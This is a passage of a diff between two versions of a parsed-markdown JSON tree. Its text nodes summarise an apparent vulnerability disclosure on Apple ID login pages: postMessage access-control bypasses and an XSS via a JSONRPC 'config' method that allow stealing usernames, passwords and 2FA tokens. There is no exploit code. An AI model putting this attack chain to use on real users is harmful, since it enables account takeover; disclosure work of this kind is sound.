>                               "offset": 76817
22734,22857d22704
<                         }
<                       ],
<                       "position": {
<                         "start": {
<                           "line": 1569,
<                           "column": 6,
<                           "offset": 76864
<                         },
<                         "end": {
<                           "line": 1569,
<                           "column": 56,
<                           "offset": 76914
<                         },
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1569,
<                       "column": 4,
<                       "offset": 76862
<                     },
<                     "end": {
<                       "line": 1569,
<                       "column": 56,
<                       "offset": 76914
<                     },
<                     "indent": []
<                   }
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1569,
<                   "column": 4,
<                   "offset": 76862
<                 },
<                 "end": {
<                   "line": 1569,
<                   "column": 56,
<                   "offset": 76914
<                 },
<                 "indent": []
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1568,
<               "column": 1,
<               "offset": 76801
<             },
<             "end": {
<               "line": 1569,
<               "column": 56,
<               "offset": 76914
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
<             {
<               "type": "paragraph",
<               "children": [
<                 {
<                   "type": "inlineCode",
<                   "value": "postMessage",
<                   "position": {
<                     "start": {
<                       "line": 1570,
<                       "column": 4,
<                       "offset": 76919
<                     },
<                     "end": {
<                       "line": 1570,
<                       "column": 17,
<                       "offset": 76932
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "text",
<                   "value": ", receive access control list bypass. (",
<                   "position": {
<                     "start": {
<                       "line": 1570,
<                       "column": 17,
<                       "offset": 76932
<                     },
<                     "end": {
<                       "line": 1570,
<                       "column": 56,
<                       "offset": 76971
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "linkReference",
<                   "identifier": "§8",
<                   "label": "§8",
<                   "referenceType": "shortcut",
<                   "children": [
<                     {
<                       "type": "text",
<                       "value": "§8",
<                       "position": {
<                         "start": {
<                           "line": 1570,
<                           "column": 57,
<                           "offset": 76972
<                         },
<                         "end": {
<                           "line": 1570,
<                           "column": 59,
<                           "offset": 76974
22859,22922d22705
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1570,
<                       "column": 56,
<                       "offset": 76971
<                     },
<                     "end": {
<                       "line": 1570,
<                       "column": 60,
<                       "offset": 76975
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "text",
<                   "value": ")",
<                   "position": {
<                     "start": {
<                       "line": 1570,
<                       "column": 60,
<                       "offset": 76975
<                     },
<                     "end": {
<                       "line": 1570,
<                       "column": 61,
<                       "offset": 76976
<                     },
<                     "indent": []
<                   }
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1570,
<                   "column": 4,
<                   "offset": 76919
<                 },
<                 "end": {
<                   "line": 1570,
<                   "column": 61,
<                   "offset": 76976
<                 },
<                 "indent": []
<               }
<             },
<             {
<               "type": "list",
<               "ordered": false,
<               "start": null,
<               "spread": false,
<               "children": [
<                 {
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
<                     {
<                       "type": "paragraph",
<                       "children": [
22925c22708
<                           "value": "Recieve information intended expressly for iCloud and other Apple ID applications",
---
>                           "value": ", send access control list bypass (",
22928,22930c22711,22713
<                               "line": 1571,
<                               "column": 6,
<                               "offset": 76983
---
>                               "line": 1568,
>                               "column": 17,
>                               "offset": 76817
22933,22935c22716,22718
<                               "line": 1571,
<                               "column": 87,
<                               "offset": 77064
---
>                               "line": 1568,
>                               "column": 52,
>                               "offset": 76852
22939,22945d22721
<                         }
<                       ],
<                       "position": {
<                         "start": {
<                           "line": 1571,
<                           "column": 6,
<                           "offset": 76983
22947,22950c22723,22759
<                         "end": {
<                           "line": 1571,
<                           "column": 87,
<                           "offset": 77064
---
>                         {
>                           "type": "linkReference",
>                           "identifier": "§7",
>                           "label": "§7",
>                           "referenceType": "shortcut",
>                           "children": [
>                             {
>                               "type": "text",
>                               "value": "§7",
>                               "position": {
>                                 "start": {
>                                   "line": 1568,
>                                   "column": 53,
>                                   "offset": 76853
>                                 },
>                                 "end": {
>                                   "line": 1568,
>                                   "column": 55,
>                                   "offset": 76855
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
>                           "position": {
>                             "start": {
>                               "line": 1568,
>                               "column": 52,
>                               "offset": 76852
>                             },
>                             "end": {
>                               "line": 1568,
>                               "column": 56,
>                               "offset": 76856
>                             },
>                             "indent": []
>                           }
22952,22977d22760
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1571,
<                       "column": 4,
<                       "offset": 76981
<                     },
<                     "end": {
<                       "line": 1571,
<                       "column": 87,
<                       "offset": 77064
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
<                     {
<                       "type": "paragraph",
<                       "children": [
22980c22763
<                           "value": "In conjunction with (2), impersonate arbitary Apple ID applications.",
---
>                           "value": ")",
22983,22985c22766,22768
<                               "line": 1572,
<                               "column": 6,
<                               "offset": 77071
---
>                               "line": 1568,
>                               "column": 56,
>                               "offset": 76856
22988,22990c22771,22773
<                               "line": 1572,
<                               "column": 74,
<                               "offset": 77139
---
>                               "line": 1568,
>                               "column": 57,
>                               "offset": 76857
22998,23000c22781,22783
<                           "line": 1572,
<                           "column": 6,
<                           "offset": 77071
---
>                           "line": 1568,
>                           "column": 4,
>                           "offset": 76804
23003,23005c22786,22788
<                           "line": 1572,
<                           "column": 74,
<                           "offset": 77139
---
>                           "line": 1568,
>                           "column": 57,
>                           "offset": 76857
23009,23020d22791
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1572,
<                       "column": 4,
<                       "offset": 77069
<                     },
<                     "end": {
<                       "line": 1572,
<                       "column": 74,
<                       "offset": 77139
23022,23029d22792
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
23031c22794,22797
<                       "type": "paragraph",
---
>                       "type": "list",
>                       "ordered": false,
>                       "start": null,
>                       "spread": false,
23034,23035c22800,22839
<                           "type": "text",
<                           "value": "Recieve iCloud and other Apple ID applications' authorization tokens, including before 2FA is completed.",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Push information across the origin trust boundary.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1569,
>                                       "column": 6,
>                                       "offset": 76864
>                                     },
>                                     "end": {
>                                       "line": 1569,
>                                       "column": 56,
>                                       "offset": 76914
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1569,
>                                   "column": 6,
>                                   "offset": 76864
>                                 },
>                                 "end": {
>                                   "line": 1569,
>                                   "column": 56,
>                                   "offset": 76914
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
23038,23040c22842,22844
<                               "line": 1573,
<                               "column": 6,
<                               "offset": 77146
---
>                               "line": 1569,
>                               "column": 4,
>                               "offset": 76862
23043,23045c22847,22849
<                               "line": 1573,
<                               "column": 110,
<                               "offset": 77250
---
>                               "line": 1569,
>                               "column": 56,
>                               "offset": 76914
23053,23055c22857,22859
<                           "line": 1573,
<                           "column": 6,
<                           "offset": 77146
---
>                           "line": 1569,
>                           "column": 4,
>                           "offset": 76862
23058,23060c22862,22864
<                           "line": 1573,
<                           "column": 110,
<                           "offset": 77250
---
>                           "line": 1569,
>                           "column": 56,
>                           "offset": 76914
23068,23070c22872,22874
<                       "line": 1573,
<                       "column": 4,
<                       "offset": 77144
---
>                       "line": 1568,
>                       "column": 1,
>                       "offset": 76801
23073,23075c22877,22879
<                       "line": 1573,
<                       "column": 110,
<                       "offset": 77250
---
>                       "line": 1569,
>                       "column": 56,
>                       "offset": 76914
23077c22881,22883
<                     "indent": []
---
>                     "indent": [
>                       1
>                     ]
23089,23090c22895,22896
<                           "type": "text",
<                           "value": "In conjunction with (2), inject configuration options that affect the appearance and function of the Apple ID login page.",
---
>                           "type": "inlineCode",
>                           "value": "postMessage",
23093,23095c22899,22901
<                               "line": 1574,
<                               "column": 6,
<                               "offset": 77257
---
>                               "line": 1570,
>                               "column": 4,
>                               "offset": 76919
23098,23100c22904,22906
<                               "line": 1574,
<                               "column": 127,
<                               "offset": 77378
---
>                               "line": 1570,
>                               "column": 17,
>                               "offset": 76932
23104,23217d22909
<                         }
<                       ],
<                       "position": {
<                         "start": {
<                           "line": 1574,
<                           "column": 6,
<                           "offset": 77257
<                         },
<                         "end": {
<                           "line": 1574,
<                           "column": 127,
<                           "offset": 77378
<                         },
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1574,
<                       "column": 4,
<                       "offset": 77255
<                     },
<                     "end": {
<                       "line": 1574,
<                       "column": 127,
<                       "offset": 77378
<                     },
<                     "indent": []
<                   }
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1571,
<                   "column": 4,
<                   "offset": 76981
<                 },
<                 "end": {
<                   "line": 1574,
<                   "column": 127,
<                   "offset": 77378
<                 },
<                 "indent": [
<                   4,
<                   4,
<                   4
<                 ]
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1570,
<               "column": 1,
<               "offset": 76916
<             },
<             "end": {
<               "line": 1574,
<               "column": 127,
<               "offset": 77378
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
<             {
<               "type": "paragraph",
<               "children": [
<                 {
<                   "type": "text",
<                   "value": "XSS via JSONRPC 'config' method (",
<                   "position": {
<                     "start": {
<                       "line": 1575,
<                       "column": 4,
<                       "offset": 77383
<                     },
<                     "end": {
<                       "line": 1575,
<                       "column": 37,
<                       "offset": 77416
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "linkReference",
<                   "identifier": "§9",
<                   "label": "§9",
<                   "referenceType": "shortcut",
<                   "children": [
<                     {
<                       "type": "text",
<                       "value": "§9",
<                       "position": {
<                         "start": {
<                           "line": 1575,
<                           "column": 38,
<                           "offset": 77417
<                         },
<                         "end": {
<                           "line": 1575,
<                           "column": 40,
<                           "offset": 77419
23219,23282d22910
<                         "indent": []
<                       }
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1575,
<                       "column": 37,
<                       "offset": 77416
<                     },
<                     "end": {
<                       "line": 1575,
<                       "column": 41,
<                       "offset": 77420
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "text",
<                   "value": ")",
<                   "position": {
<                     "start": {
<                       "line": 1575,
<                       "column": 41,
<                       "offset": 77420
<                     },
<                     "end": {
<                       "line": 1575,
<                       "column": 42,
<                       "offset": 77421
<                     },
<                     "indent": []
<                   }
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1575,
<                   "column": 4,
<                   "offset": 77383
<                 },
<                 "end": {
<                   "line": 1575,
<                   "column": 42,
<                   "offset": 77421
<                 },
<                 "indent": []
<               }
<             },
<             {
<               "type": "list",
<               "ordered": false,
<               "start": null,
<               "spread": false,
<               "children": [
<                 {
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
<                     {
<                       "type": "paragraph",
<                       "children": [
23285c22913
<                           "value": "Take over the Apple ID system, ",
---
>                           "value": ", receive access control list bypass. (",
23288,23290c22916,22918
<                               "line": 1576,
<                               "column": 6,
<                               "offset": 77428
---
>                               "line": 1570,
>                               "column": 17,
>                               "offset": 76932
23293,23295c22921,22923
<                               "line": 1576,
<                               "column": 37,
<                               "offset": 77459
---
>                               "line": 1570,
>                               "column": 56,
>                               "offset": 76971
23301,23302c22929,22951
<                           "type": "inlineCode",
<                           "value": "idmsa.apple.com",
---
>                           "type": "linkReference",
>                           "identifier": "§8",
>                           "label": "§8",
>                           "referenceType": "shortcut",
>                           "children": [
>                             {
>                               "type": "text",
>                               "value": "§8",
>                               "position": {
>                                 "start": {
>                                   "line": 1570,
>                                   "column": 57,
>                                   "offset": 76972
>                                 },
>                                 "end": {
>                                   "line": 1570,
>                                   "column": 59,
>                                   "offset": 76974
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
23305,23307c22954,22956
<                               "line": 1576,
<                               "column": 37,
<                               "offset": 77459
---
>                               "line": 1570,
>                               "column": 56,
>                               "offset": 76971
23310,23312c22959,22961
<                               "line": 1576,
<                               "column": 54,
<                               "offset": 77476
---
>                               "line": 1570,
>                               "column": 60,
>                               "offset": 76975
23319c22968
<                           "value": " temporarily in the victim's browser.",
---
>                           "value": ")",
23322,23324c22971,22973
<                               "line": 1576,
<                               "column": 54,
<                               "offset": 77476
---
>                               "line": 1570,
>                               "column": 60,
>                               "offset": 76975
23327,23329c22976,22978
<                               "line": 1576,
<                               "column": 91,
<                               "offset": 77513
---
>                               "line": 1570,
>                               "column": 61,
>                               "offset": 76976
23337,23339c22986,22988
<                           "line": 1576,
<                           "column": 6,
<                           "offset": 77428
---
>                           "line": 1570,
>                           "column": 4,
>                           "offset": 76919
23342,23344c22991,22993
<                           "line": 1576,
<                           "column": 91,
<                           "offset": 77513
---
>                           "line": 1570,
>                           "column": 61,
>                           "offset": 76976
23348,23359d22996
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1576,
<                       "column": 4,
<                       "offset": 77426
<                     },
<                     "end": {
<                       "line": 1576,
<                       "column": 91,
<                       "offset": 77513
23361,23368d22997
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
23370c22999,23002
<                       "type": "paragraph",
---
>                       "type": "list",
>                       "ordered": false,
>                       "start": null,
>                       "spread": false,
23373,23374c23005,23044
<                           "type": "text",
<                           "value": "Escape from the embedding frame and take over other, legitimate ",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Recieve information intended expressly for iCloud and other Apple ID applications",
>                                   "position": {
>                                     "start": {
>                                       "line": 1571,
>                                       "column": 6,
>                                       "offset": 76983
>                                     },
>                                     "end": {
>                                       "line": 1571,
>                                       "column": 87,
>                                       "offset": 77064
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1571,
>                                   "column": 6,
>                                   "offset": 76983
>                                 },
>                                 "end": {
>                                   "line": 1571,
>                                   "column": 87,
>                                   "offset": 77064
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
23377,23379c23047,23049
<                               "line": 1577,
<                               "column": 6,
<                               "offset": 77520
---
>                               "line": 1571,
>                               "column": 4,
>                               "offset": 76981
23382,23384c23052,23054
<                               "line": 1577,
<                               "column": 70,
<                               "offset": 77584
---
>                               "line": 1571,
>                               "column": 87,
>                               "offset": 77064
23390,23391c23060,23099
<                           "type": "inlineCode",
<                           "value": "idmsa.apple.com",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "In conjunction with (2), impersonate arbitary Apple ID applications.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1572,
>                                       "column": 6,
>                                       "offset": 77071
>                                     },
>                                     "end": {
>                                       "line": 1572,
>                                       "column": 74,
>                                       "offset": 77139
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1572,
>                                   "column": 6,
>                                   "offset": 77071
>                                 },
>                                 "end": {
>                                   "line": 1572,
>                                   "column": 74,
>                                   "offset": 77139
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
23394,23396c23102,23104
<                               "line": 1577,
<                               "column": 70,
<                               "offset": 77584
---
>                               "line": 1572,
>                               "column": 4,
>                               "offset": 77069
23399,23401c23107,23109
<                               "line": 1577,
<                               "column": 87,
<                               "offset": 77601
---
>                               "line": 1572,
>                               "column": 74,
>                               "offset": 77139
23407,23408c23115,23154
<                           "type": "text",
<                           "value": " pages.",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Recieve iCloud and other Apple ID applications' authorization tokens, including before 2FA is completed.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1573,
>                                       "column": 6,
>                                       "offset": 77146
>                                     },
>                                     "end": {
>                                       "line": 1573,
>                                       "column": 110,
>                                       "offset": 77250
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1573,
>                                   "column": 6,
>                                   "offset": 77146
>                                 },
>                                 "end": {
>                                   "line": 1573,
>                                   "column": 110,
>                                   "offset": 77250
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
23411,23413c23157,23159
<                               "line": 1577,
<                               "column": 87,
<                               "offset": 77601
---
>                               "line": 1573,
>                               "column": 4,
>                               "offset": 77144
23416,23418c23162,23219
<                               "line": 1577,
<                               "column": 94,
<                               "offset": 77608
---
>                               "line": 1573,
>                               "column": 110,
>                               "offset": 77250
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "In conjunction with (2), inject configuration options that affect the appearance and function of the Apple ID login page.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1574,
>                                       "column": 6,
>                                       "offset": 77257
>                                     },
>                                     "end": {
>                                       "line": 1574,
>                                       "column": 127,
>                                       "offset": 77378
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1574,
>                                   "column": 6,
>                                   "offset": 77257
>                                 },
>                                 "end": {
>                                   "line": 1574,
>                                   "column": 127,
>                                   "offset": 77378
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
>                           "position": {
>                             "start": {
>                               "line": 1574,
>                               "column": 4,
>                               "offset": 77255
>                             },
>                             "end": {
>                               "line": 1574,
>                               "column": 127,
>                               "offset": 77378
23426,23428c23227,23229
<                           "line": 1577,
<                           "column": 6,
<                           "offset": 77520
---
>                           "line": 1571,
>                           "column": 4,
>                           "offset": 76981
23431,23433c23232,23234
<                           "line": 1577,
<                           "column": 94,
<                           "offset": 77608
---
>                           "line": 1574,
>                           "column": 127,
>                           "offset": 77378
23435c23236,23240
<                         "indent": []
---
>                         "indent": [
>                           4,
>                           4,
>                           4
>                         ]
23441,23443c23246,23248
<                       "line": 1577,
<                       "column": 4,
<                       "offset": 77518
---
>                       "line": 1570,
>                       "column": 1,
>                       "offset": 76916
23446,23448c23251,23253
<                       "line": 1577,
<                       "column": 94,
<                       "offset": 77608
---
>                       "line": 1574,
>                       "column": 127,
>                       "offset": 77378
23450c23255,23260
<                     "indent": []
---
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
23463c23273
<                           "value": "Extract usernames, passwords and 2FA tokens from ",
---
>                           "value": "XSS via JSONRPC 'config' method (",
23466,23468c23276,23278
<                               "line": 1578,
<                               "column": 6,
<                               "offset": 77615
---
>                               "line": 1575,
>                               "column": 4,
>                               "offset": 77383
23471,23473c23281,23283
<                               "line": 1578,
<                               "column": 55,
<                               "offset": 77664
---
>                               "line": 1575,
>                               "column": 37,
>                               "offset": 77416
23479,23480c23289,23311
<                           "type": "inlineCode",
<                           "value": "idmsa.apple.com",
---
>                           "type": "linkReference",
>                           "identifier": "§9",
>                           "label": "§9",
>                           "referenceType": "shortcut",
>                           "children": [
>                             {
>                               "type": "text",
>                               "value": "§9",
>                               "position": {
>                                 "start": {
>                                   "line": 1575,
>                                   "column": 38,
>                                   "offset": 77417
>                                 },
>                                 "end": {
>                                   "line": 1575,
>                                   "column": 40,
>                                   "offset": 77419
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
23483,23485c23314,23316
<                               "line": 1578,
<                               "column": 55,
<                               "offset": 77664
---
>                               "line": 1575,
>                               "column": 37,
>                               "offset": 77416
23488,23490c23319,23321
<                               "line": 1578,
<                               "column": 72,
<                               "offset": 77681
---
>                               "line": 1575,
>                               "column": 41,
>                               "offset": 77420
23497c23328
<                           "value": " pages.",
---
>                           "value": ")",
23500,23502c23331,23333
<                               "line": 1578,
<                               "column": 72,
<                               "offset": 77681
---
>                               "line": 1575,
>                               "column": 41,
>                               "offset": 77420
23505,23507c23336,23338
<                               "line": 1578,
<                               "column": 79,
<                               "offset": 77688
---
>                               "line": 1575,
>                               "column": 42,
>                               "offset": 77421
23515,23517c23346,23348
<                           "line": 1578,
<                           "column": 6,
<                           "offset": 77615
---
>                           "line": 1575,
>                           "column": 4,
>                           "offset": 77383
23520,23522c23351,23353
<                           "line": 1578,
<                           "column": 79,
<                           "offset": 77688
---
>                           "line": 1575,
>                           "column": 42,
>                           "offset": 77421
23526,23532d23356
<                     }
<                   ],
<                   "position": {
<                     "start": {
<                       "line": 1578,
<                       "column": 4,
<                       "offset": 77613
23534,23546d23357
<                     "end": {
<                       "line": 1578,
<                       "column": 79,
<                       "offset": 77688
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "listItem",
<                   "spread": false,
<                   "checked": null,
<                   "children": [
23548c23359,23362
<                       "type": "paragraph",
---
>                       "type": "list",
>                       "ordered": false,
>                       "start": null,
>                       "spread": false,
23551,23552c23365,23438
<                           "type": "text",
<                           "value": "Near full control of the function and display of ",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Take over the Apple ID system, ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1576,
>                                       "column": 6,
>                                       "offset": 77428
>                                     },
>                                     "end": {
>                                       "line": 1576,
>                                       "column": 37,
>                                       "offset": 77459
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "inlineCode",
>                                   "value": "idmsa.apple.com",
>                                   "position": {
>                                     "start": {
>                                       "line": 1576,
>                                       "column": 37,
>                                       "offset": 77459
>                                     },
>                                     "end": {
>                                       "line": 1576,
>                                       "column": 54,
>                                       "offset": 77476
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "text",
>                                   "value": " temporarily in the victim's browser.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1576,
>                                       "column": 54,
>                                       "offset": 77476
>                                     },
>                                     "end": {
>                                       "line": 1576,
>                                       "column": 91,
>                                       "offset": 77513
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1576,
>                                   "column": 6,
>                                   "offset": 77428
>                                 },
>                                 "end": {
>                                   "line": 1576,
>                                   "column": 91,
>                                   "offset": 77513
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
23555,23557c23441,23443
<                               "line": 1579,
<                               "column": 6,
<                               "offset": 77695
---
>                               "line": 1576,
>                               "column": 4,
>                               "offset": 77426
23560,23562c23446,23448
<                               "line": 1579,
<                               "column": 55,
<                               "offset": 77744
---
>                               "line": 1576,
>                               "column": 91,
>                               "offset": 77513
23568,23569c23454,23527
<                           "type": "inlineCode",
<                           "value": "idmsa.apple.com",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Escape from the embedding frame and take over other, legitimate ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1577,
>                                       "column": 6,
>                                       "offset": 77520
>                                     },
>                                     "end": {
>                                       "line": 1577,
>                                       "column": 70,
>                                       "offset": 77584
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "inlineCode",
>                                   "value": "idmsa.apple.com",
>                                   "position": {
>                                     "start": {
>                                       "line": 1577,
>                                       "column": 70,
>                                       "offset": 77584
>                                     },
>                                     "end": {
>                                       "line": 1577,
>                                       "column": 87,
>                                       "offset": 77601
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "text",
>                                   "value": " pages.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1577,
>                                       "column": 87,
>                                       "offset": 77601
>                                     },
>                                     "end": {
>                                       "line": 1577,
>                                       "column": 94,
>                                       "offset": 77608
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1577,
>                                   "column": 6,
>                                   "offset": 77520
>                                 },
>                                 "end": {
>                                   "line": 1577,
>                                   "column": 94,
>                                   "offset": 77608
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
23572,23574c23530,23532
<                               "line": 1579,
<                               "column": 55,
<                               "offset": 77744
---
>                               "line": 1577,
>                               "column": 4,
>                               "offset": 77518
23577,23579c23535,23537
<                               "line": 1579,
<                               "column": 72,
<                               "offset": 77761
---
>                               "line": 1577,
>                               "column": 94,
>                               "offset": 77608
23585,23586c23543,23705
<                           "type": "text",
<                           "value": " Apple ID login pages.",
---
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Extract usernames, passwords and 2FA tokens from ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1578,
>                                       "column": 6,
>                                       "offset": 77615
>                                     },
>                                     "end": {
>                                       "line": 1578,
>                                       "column": 55,
>                                       "offset": 77664
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "inlineCode",
>                                   "value": "idmsa.apple.com",
>                                   "position": {
>                                     "start": {
>                                       "line": 1578,
>                                       "column": 55,
>                                       "offset": 77664
>                                     },
>                                     "end": {
>                                       "line": 1578,
>                                       "column": 72,
>                                       "offset": 77681
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "text",
>                                   "value": " pages.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1578,
>                                       "column": 72,
>                                       "offset": 77681
>                                     },
>                                     "end": {
>                                       "line": 1578,
>                                       "column": 79,
>                                       "offset": 77688
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1578,
>                                   "column": 6,
>                                   "offset": 77615
>                                 },
>                                 "end": {
>                                   "line": 1578,
>                                   "column": 79,
>                                   "offset": 77688
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
>                           "position": {
>                             "start": {
>                               "line": 1578,
>                               "column": 4,
>                               "offset": 77613
>                             },
>                             "end": {
>                               "line": 1578,
>                               "column": 79,
>                               "offset": 77688
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "listItem",
>                           "spread": false,
>                           "checked": null,
>                           "children": [
>                             {
>                               "type": "paragraph",
>                               "children": [
>                                 {
>                                   "type": "text",
>                                   "value": "Near full control of the function and display of ",
>                                   "position": {
>                                     "start": {
>                                       "line": 1579,
>                                       "column": 6,
>                                       "offset": 77695
>                                     },
>                                     "end": {
>                                       "line": 1579,
>                                       "column": 55,
>                                       "offset": 77744
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "inlineCode",
>                                   "value": "idmsa.apple.com",
>                                   "position": {
>                                     "start": {
>                                       "line": 1579,
>                                       "column": 55,
>                                       "offset": 77744
>                                     },
>                                     "end": {
>                                       "line": 1579,
>                                       "column": 72,
>                                       "offset": 77761
>                                     },
>                                     "indent": []
>                                   }
>                                 },
>                                 {
>                                   "type": "text",
>                                   "value": " Apple ID login pages.",
>                                   "position": {
>                                     "start": {
>                                       "line": 1579,
>                                       "column": 72,
>                                       "offset": 77761
>                                     },
>                                     "end": {
>                                       "line": 1579,
>                                       "column": 94,
>                                       "offset": 77783
>                                     },
>                                     "indent": []
>                                   }
>                                 }
>                               ],
>                               "position": {
>                                 "start": {
>                                   "line": 1579,
>                                   "column": 6,
>                                   "offset": 77695
>                                 },
>                                 "end": {
>                                   "line": 1579,
>                                   "column": 94,
>                                   "offset": 77783
>                                 },
>                                 "indent": []
>                               }
>                             }
>                           ],
23590,23591c23709,23710
<                               "column": 72,
<                               "offset": 77761
---
>                               "column": 4,
>                               "offset": 77693
23604,23606c23723,23725
<                           "line": 1579,
<                           "column": 6,
<                           "offset": 77695
---
>                           "line": 1576,
>                           "column": 4,
>                           "offset": 77426
23613c23732,23736
<                         "indent": []
---
>                         "indent": [
>                           4,
>                           4,
>                           4
>                         ]
23619,23621c23742,23744
<                       "line": 1579,
<                       "column": 4,
<                       "offset": 77693
---
>                       "line": 1575,
>                       "column": 1,
>                       "offset": 77380
23628c23751,23756
<                     "indent": []
---
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
23634,23636c23762,23764
<                   "line": 1576,
<                   "column": 4,
<                   "offset": 77426
---
>                   "line": 1563,
>                   "column": 1,
>                   "offset": 76338
23644,23646c23772,23787
<                   4,
<                   4,
<                   4
---
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
23651,23667c23792,23793
<           "position": {
<             "start": {
<               "line": 1575,
<               "column": 1,
<               "offset": 77380
<             },
<             "end": {
<               "line": 1579,
<               "column": 94,
